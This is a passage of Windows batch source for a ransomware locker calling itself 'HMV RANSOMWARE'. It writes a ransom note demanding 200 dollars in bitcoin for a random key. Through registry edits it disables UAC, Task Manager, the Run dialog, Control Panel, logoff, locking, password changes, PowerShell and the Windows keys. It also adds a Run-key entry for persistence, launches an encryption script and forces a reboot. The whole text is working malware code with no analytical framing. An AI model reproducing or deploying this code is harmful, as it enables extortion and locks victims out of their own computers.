echo cd %userprofile%\Desktop>>Decrypt.bat
echo for /r %%%%i in (*.HMV) do del "%%%%i">>Decrypt.bat
echo del Readme.txt>>Decrypt.bat
echo cd %userprofile%\Downloads>>Decrypt.bat
echo for /r %%%%i in (*.HMV) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Videos>>Decrypt.bat
echo for /r %%%%i in (*.HMV) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Documents>>Decrypt.bat
echo for /r %%%%i in (*.HMV) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Music>>Decrypt.bat
echo for /r %%%%i in (*.HMV) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Pictures>>Decrypt.bat
echo for /r %%%%i in (*.HMV) do del "%%%%i">>Decrypt.bat
echo start %appdata%\HMV\Programs\Regedit.vbs>>Decrypt.bat

:HMV
cd %appdata%\HMV
set aa=%random%%random%
echo %aa%>key.txt
cls

cd %appdata%\HMV\Programs
echo @echo off>HMV.bat
echo :a>>HMV.bat
echo color 09>>HMV.bat

echo echo ----What happened to my files?---->>HMV.bat
echo echo Your personal files are all encrypted by HMV RANSOMWARE.>>HMV.bat
echo echo You cannot access your files until you get your PERSONAL KEY.>>HMV.bat
echo echo.>>HMV.bat
echo echo ----How Can I get my key?---->>HMV.bat
echo echo Pay 200 dollars worth bitcoin by the link, and you'll get your personal key.>>HMV.bat
echo echo : %random%%random%@gmail.com>>HMV.bat
echo echo.>>HMV.bat

echo set bb=%aa%>>HMV.bat
echo set /p key=Decryption Key: >>HMV.bat
echo if %%key%%==%%bb%% goto b>>HMV.bat
echo.>>HMV.bat
echo cls>>HMV.bat
echo goto a>>HMV.bat
echo.>>HMV.bat
echo :b>>HMV.bat
echo cls>>HMV.bat
echo echo right Decryption Key...>>HMV.bat
echo echo Click Any Keys>>HMV.bat
echo PAUSE^>nul>>HMV.bat
echo cd %appdata%\HMV\Programs>>HMV.bat
echo start Decrypt.vbs>>HMV.bat

:VBS_D
echo Set objShell = CreateObject("Shell.Application") >Decrypt.vbs
echo objShell.ShellExecute "%appdata%\HMV\Programs\Decrypt.bat", "/c lodctr.exe /r", "", "runas", 0 >>Decrypt.vbs

:Regedit
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t "REG_DWORD" /d "0" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t "REG_DWORD" /d "1" /f
reg add "HKEY_CURRENT_USER\Control Panel\Mouse" /v "SwapMouseButtons" /t "REG_SZ" /d "1" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t "REG_DWORD" /d "1" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t "REG_DWORD" /d "1" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableChangePassword" /t "REG_DWORD" /d "1" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLogoff" /t "REG_DWORD" /d "1" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t "REG_DWORD" /d "1" /f
reg add "HKEY_CURRENT_USER\Control Panel\Accessibility\StickyKeys" /v "Flags" /t "REG_SZ" /d "506" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "DisallowRun" /t "REG_DWORD" /d "1" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "1" /t "REG_SZ" /d "powershell.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoWinKeys" /t "REG_DWORD" /d "1" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "HMV" /t "REG_SZ" /d "%appdata%\HMV\Programs\HMV.bat" /f

:Reg_Del
echo reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t "REG_DWORD" /d "1" /f>>D_Regedit.bat
echo reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /f>>D_Regedit.bat
echo reg delete "HKEY_CURRENT_USER\Control Panel\Mouse" /v "SwapMouseButtons" /f>>D_Regedit.bat
echo reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /f>>D_Regedit.bat
echo reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /f>>D_Regedit.bat
echo reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableChangePassword" /f>>D_Regedit.bat
echo reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLogoff" /f>>D_Regedit.bat
echo reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /f>>D_Regedit.bat
echo reg delete "HKEY_CURRENT_USER\Control Panel\Accessibility\StickyKeys" /v "Flags" /f>>D_Regedit.bat
echo reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "DisallowRun" /f>>D_Regedit.bat
echo reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "1" /f>>D_Regedit.bat
echo reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoWinKeys" /f>>D_Regedit.bat
echo reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "HMV" /f>>D_Regedit.bat
echo rmdir /s /q %appdata%\HMV>>D_Regedit.bat

:VBS_Regedit
echo Set objShell = CreateObject("Shell.Application") >Regedit.vbs
echo objShell.ShellExecute "%appdata%\HMV\Programs\D_Regedit.bat", "/c lodctr.exe /r", "", "runas", 0 >>Regedit.vbs

start encrypt.vbs
shutdown -r -t 1
exit
